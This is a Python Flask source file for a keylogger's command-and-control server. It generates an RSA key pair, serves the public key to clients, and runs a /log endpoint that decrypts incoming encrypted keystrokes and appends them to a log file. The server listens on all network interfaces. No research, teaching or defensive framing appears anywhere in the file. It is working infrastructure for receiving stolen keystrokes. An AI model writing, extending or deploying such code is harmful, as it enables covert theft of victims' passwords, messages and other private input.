import os
from flask import Flask, request, jsonify
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes, serialization
import base64
import datetime

app = Flask(__name__)

# Generate or load RSA key pair
KEY_FILE = "private_key.pem"
PUBLIC_KEY_FILE = "public_key.pem"

if not os.path.exists(KEY_FILE):
    # Generate new key pair
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048
    )
    
    # Save private key
    with open(KEY_FILE, "wb") as f:
        f.write(private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        ))
    
    # Save public key
    public_key = private_key.public_key()
    with open(PUBLIC_KEY_FILE, "wb") as f:
        f.write(public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        ))
else:
    # Load existing key
    with open(KEY_FILE, "rb") as key_file:
        private_key = serialization.load_pem_private_key(
            key_file.read(),
            password=None
        )

# Function to decrypt data with private key
def decrypt_data(encrypted_data):
    encrypted_bytes = base64.b64decode(encrypted_data)
    decrypted_bytes = private_key.decrypt(
        encrypted_bytes,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return decrypted_bytes.decode('utf-8')

# API endpoint to receive keystrokes
@app.route('/log', methods=['POST'])
def log_keystroke():
    if not request.is_json:
        return jsonify({"error": "Invalid request format"}), 400
    
    data = request.json
    encrypted_keystrokes = data.get('data')
    
    if not encrypted_keystrokes:
        return jsonify({"error": "No data provided"}), 400
    
    try:
        decrypted_keystrokes = decrypt_data(encrypted_keystrokes)
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Save to logfile
        with open("keystroke_log.txt", "a") as log_file:
            log_file.write(f"[{timestamp}] {decrypted_keystrokes}\n")
        
        return jsonify({"status": "success"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# Endpoint to get the public key
@app.route('/public_key', methods=['GET'])
def get_public_key():
    with open(PUBLIC_KEY_FILE, "rb") as key_file:
        public_key_pem = key_file.read()
    return public_key_pem

if __name__ == "__main__":
    # Run on all interfaces, port 5000
    app.run(host='0.0.0.0', port=5000, debug=False)
